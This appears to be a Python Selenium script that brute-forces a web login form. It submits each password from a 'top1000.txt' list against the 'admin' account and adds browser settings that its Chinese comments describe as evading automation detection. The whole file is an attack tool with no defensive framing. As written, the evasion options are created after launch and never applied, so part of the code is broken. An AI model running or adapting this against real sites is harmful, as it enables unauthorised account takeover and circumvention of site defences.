
#coding utf-8
from selenium import webdriver
from time import sleep
from selenium.webdriver import ActionChains
from selenium.webdriver import ChromeOptions



#登录
def login(username, password):

    user = browser.find_element_by_xpath('//*[@id="txtUserID"]')
    user.send_keys(username)  # 输入用户名
    ActionChains(browser).click(browser.find_element_by_id('txtPwd')).send_keys(password).perform()
    login_btn = browser.find_element_by_xpath('//*[@id="Image1"]')  # 登陆按钮
    sleep(2)
    login_btn.click()




if __name__=='__main__':
    driverfile_path = r'./chromedriver.exe'
    # 实现规避检测
    option = ChromeOptions()
    browser = webdriver.Chrome(executable_path=driverfile_path)
    browser.get('')
    # 添加user-agent
    option.add_experimental_option('excludeSwitches', ['enable-automation'])
    # 隐藏window.navigator.webdriver
    option.add_argument("--disable-blink-features=AutomationControlled")
    option.add_argument(
        'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36')
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
    }
    with open('./top1000.txt', 'r') as f:
        result = f.readlines()
        for i in result:
            i = i.strip('\n')
            login('admin', '{i}'.format(i=i))
            sleep(2)



